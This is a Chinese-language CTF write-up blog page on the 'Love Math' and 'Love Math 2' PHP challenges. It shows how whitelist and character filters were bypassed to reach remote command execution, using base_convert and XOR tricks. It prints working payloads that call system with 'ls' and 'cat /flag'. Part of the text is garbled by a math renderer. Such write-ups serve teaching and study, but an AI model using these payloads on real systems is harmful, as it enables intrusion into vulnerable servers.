<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>[CISCN/NESTCTF]Love Math 命令执行 | 过客</title>
<meta name="description" content="this is a test Web">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582682911863">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">



<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>

<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />



  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://guokeya.github.io">
        <img src="https://guokeya.github.io/images/avatar.png?v=1582682911863" class="site-logo">
        <h1 class="site-title">过客</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            首页
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            归档
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            关于
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            分类
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      this is a test Web
    </div>
    <div class="site-footer">
       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">[CISCN/NESTCTF]Love Math 命令执行</h2>
            <div class="post-date">2020-01-05</div>
            
            <div class="post-content">
              <p><strong>CISCN2019</strong><br>
有三个判断。<br>
1：输入不能大于80<br>
2：不能有空格\t\r等字符<br>
3：只能用白名单内的函数</p>
<!-- more -->
<p><img src="https://guokeya.github.io/post-images/1578213796135.png" alt="" loading="lazy"><br>
base_convert是可以对字符进行转换的。那么我们就可以通过这个函数将恶意代码转换为数字<br>
<img src="https://guokeya.github.io/post-images/1578214233798.png" alt="" loading="lazy"><br>
我们已经成功构造出了phpinfo,第一个过滤中也没过滤括号。<br>
<img src="https://guokeya.github.io/post-images/1578214942266.png" alt="" loading="lazy"><br>
下一步。我们就构造命令执行。<br>
挑个最短的exec，由于base_convert只能构造出小写字母。$_GET这类就不行了。上次说过getallheaders这个函数。可以通过http请求传参。返回数组。然而[]被过滤，这里还有另一种取数组值的方式{1},取1键对应的值。为什么不用之前说的end(getallheaders()))，尝试了下。长度超了。能短就短吧。</p>
<pre><code>exec=base_convert(696468,10,36)
getallheaders=base_convert(8768397090111664438,10,30)
#转换为36进制 的时候转回来会溢出。所以用30进制
</code></pre>
<p>exec(getallheaders(){1})<br>
将各部分替换<br>
base_convert(696468,10,36)(base_convert(8768397090111664438,10,30)(){1})<br>
<img src="https://guokeya.github.io/post-images/1578216004220.png" alt="" loading="lazy"><br>
还有更短的。由于没过滤<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">和</mi><mi mathvariant="normal">；</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">把</mi><mi>b</mi><mi>a</mi><mi>s</mi><msub><mi>e</mi><mi>c</mi></msub><mi>o</mi><mi>n</mi><mi>v</mi><mi>e</mi><mi>r</mi><mi>t</mi><mi mathvariant="normal">定</mi><mi mathvariant="normal">义</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">变</mi><mi mathvariant="normal">量</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">调</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">‘</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">和；，
那么我们就可以把base_convert定义为一个变量。然后调用
``</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">和</span><span class="mord cjk_fallback">；</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">把</span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">调</span><span class="mord cjk_fallback">用</span><span class="mord">‘</span><span class="mord">‘</span></span></span></span>pi=base_convert,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi>i</mi><mo>(</mo><mn>696468</mn><mo separator="true">,</mo><mn>10</mn><mo separator="true">,</mo><mn>36</mn><mo>)</mo><mo>(</mo><mo>(</mo></mrow><annotation encoding="application/x-tex">pi(696468,10,36)((</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">p</span><span class="mord mathdefault">i</span><span class="mopen">(</span><span class="mord">6</span><span class="mord">9</span><span class="mord">6</span><span class="mord">4</span><span class="mord">6</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mord">6</span><span class="mclose">)</span><span class="mopen">(</span><span class="mopen">(</span></span></span></span>pi(8768397090111664438,10,30))(){1})``<br>
注意。在构造getallheaders外面要用()包裹<br>
还有就是通过构造_GET来接收参数。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>G</mi></msub><mi>E</mi><mi>T</mi><mo>[</mo><mn>0</mn><mo>]</mo><mo>(</mo></mrow><annotation encoding="application/x-tex">_GET[0](</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">G</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">(</span></span></span></span>_GET[1])<br>
payload如下:</p>
<pre><code>?c=$pi=base_convert;$pi=${$pi(1114322,10,36)^$pi(47989,10,36)};$pi{1}($pi{0})&amp;1=system&amp;0=ls
</code></pre>
<p>由于base_convert只能构造出小写字母。但我们可以通过异或来得到大写字母。<br>
<strong>[NESTCTF 2019]Love Math 2</strong><br>
<img src="https://guokeya.github.io/post-images/1578291037924.png" alt="" loading="lazy"><br>
相对于第一题。没有了base_convert函数。但是^并没有过滤<br>
我们可以通过^字符串来获取我们想要的字符</p>
<pre><code>$pi=${hexdec^decoct(31737)};$pi{1}($pi{2});
POST:1=system&amp;2=cat /flag
</code></pre>
<p>将hexdec字符串异或数字223773<br>
主要是通过phpfuzz<br>
<img src="https://guokeya.github.io/post-images/1578292463954.png" alt="" loading="lazy"></p>

            </div>
            
              <div class="tag-container">
                
                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
                    CTF
                  </a>
                
                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
                    Web安全
                  </a>
                
              </div>
            
            
              <div class="next-post">
                <div class="next">下一篇</div>
                <a href="https://guokeya.github.io/post/cbMk6sLKe/">
                  <h3 class="post-title">
                    PHP LFI的两种姿势(PHP7崩溃+phpinfo缓存文件)
                  </h3>
                </a>
              </div>
            

            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>

<script type="application/javascript">

AOS.init();

hljs.initHighlightingOnLoad()

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>




  </body>
</html>
